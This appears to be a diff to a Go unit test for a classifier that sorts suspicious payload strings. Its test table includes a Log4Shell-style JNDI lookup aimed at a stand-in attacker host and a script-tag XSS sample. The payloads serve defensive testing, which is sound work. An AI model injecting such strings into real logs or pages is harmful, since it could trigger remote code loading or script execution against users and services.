@@ -31,6 +31,8 @@ func TestClassifyPayloadIsolation(t *testing.T) {
 		{"prose-jndi", `note ${jndi:ldap://evil.example/a} in logs`, isolationEmbedded},
 		{"empty", ``, isolationUnknown},
 		{"plain", `hello world`, isolationUnknown},
+		// XSS is not on the isolation gadget list; shape guards handle it elsewhere.
+		{"xss-article", `<script>alert(1)</script> in an article`, isolationUnknown},
 	}
 	for _, tc := range cases {
 		t.Run(tc.name, func(t *testing.T) {
